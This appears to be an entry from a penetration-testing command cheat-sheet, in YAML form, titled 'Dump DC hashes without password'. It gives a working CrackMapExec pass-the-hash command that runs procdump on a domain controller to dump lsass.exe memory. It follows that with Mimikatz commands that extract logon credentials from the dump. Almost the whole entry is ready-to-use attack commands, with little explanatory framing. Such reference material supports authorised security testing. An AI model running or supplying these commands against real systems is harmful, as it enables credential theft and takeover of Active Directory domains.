---
title: |
  Dump DC hashes without password
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. Create a list of targets with SMB Signing disabled (required to relay).

  Retrieve lsass.dmp and extract hashes with for example Mimikatz.

  Other command:

    mimikatz> sekurlsa::minidump lsass.dmp

    sekurlsa::logonPasswords

command: |
  crackmapexec smb 172.28.2.100 -u <username> -d <domain> -H <NTLM hash> -x 'C:\Windows\temp\procdump.exe -accepteula -ma lsass.exe C:\Windows\temp\lsass.dmp'
items:
  - Username
  - Hash
services:
  - SMB
OS:
  - Linux
attack_types:
  - Exploitation
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
